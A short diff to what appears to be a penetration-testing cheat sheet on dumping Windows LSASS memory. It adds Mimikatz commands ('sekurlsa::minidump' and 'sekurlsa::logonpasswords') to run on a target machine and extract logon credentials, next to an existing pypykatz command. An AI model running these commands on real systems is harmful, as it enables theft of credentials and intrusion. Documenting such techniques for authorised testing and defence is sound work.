@@ -56,6 +56,11 @@ Tool: Mimikatz, Process Hacker, WinDbg
   ```bash
   pypykatz lsa minidump lsass.dmp
   ```
+  - OR use mimkatz.exe on the targer machine
+  ```powershell
+  ./mimikatz.exe 'sekurlsa::minidump lsass.dmp' exit
+  ./mimikatz.exe 'sekurlsa::logonpasswords' exit
+  ```
 
 
 
